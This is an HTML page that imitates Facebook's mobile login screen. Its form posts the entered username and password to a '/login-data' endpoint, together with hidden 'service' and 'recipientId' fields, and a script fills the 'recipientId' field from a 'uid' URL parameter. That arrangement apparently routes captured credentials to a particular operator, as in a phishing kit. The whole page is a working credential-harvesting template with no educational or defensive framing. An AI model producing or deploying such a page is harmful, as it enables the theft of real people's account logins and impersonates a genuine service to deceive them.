<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; }
        .container { display: flex; flex-direction: column; align-items: center; padding-top: 80px; box-sizing: border-box; }
        .logo { color: #1877f2; font-size: 48px; font-weight: bold; margin-bottom: 40px; }
        .login-box { background-color: #fff; padding: 20px; border-radius: 8px; width: calc(100% - 40px); max-width: 380px; box-shadow: 0 2px 4px rgba(0,0,0,.1); text-align: center; }
        input { width: 100%; padding: 14px 16px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 6px; margin-bottom: 12px; box-sizing: border-box; }
        button { width: 100%; background-color: #1877f2; border: none; border-radius: 6px; font-size: 20px; line-height: 48px; padding: 0 16px; color: #fff; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <div class="login-box">
            <form action="/login-data" method="post">
                <input type="text" name="username" placeholder="Mobile number or email address" required autocapitalize="none">
                <input type="password" name="password" placeholder="Password" required>
                <input type="hidden" name="service" value="Facebook">
                <input type="hidden" id="recipientId" name="recipientId" value="">
                <button type="submit">Log In</button>
            </form>
        </div>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const params = new URLSearchParams(window.location.search);
            const userId = params.get('uid');
            if (userId) document.getElementById('recipientId').value = userId;
        });
    </script>
</body>
</html>
